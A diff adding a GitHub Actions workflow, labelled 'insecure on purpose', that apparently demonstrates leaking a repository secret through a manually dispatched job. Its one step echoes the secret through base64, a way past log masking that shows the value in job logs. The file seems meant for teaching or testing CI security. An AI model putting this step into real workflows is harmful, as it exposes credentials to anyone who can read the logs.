@@ -1,0 +1,13 @@
+# ATTACK 2 (insecure on purpose). A manual workflow that leaks the secret,
+# runnable from the Actions tab outside the push/pull_request flow. Same payload
+# as attack 1, but a different trigger (workflow_dispatch), which is a separate
+# entry point from push. A workflow_dispatch workflow must exist on the default
+# branch to be dispatched. Rename to remove .insecure to run it.
+name: dispatch-leak
+on: workflow_dispatch
+permissions: {}
+jobs:
+  leak:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: echo "${{ secrets.DEMO_SECRET }}" | base64
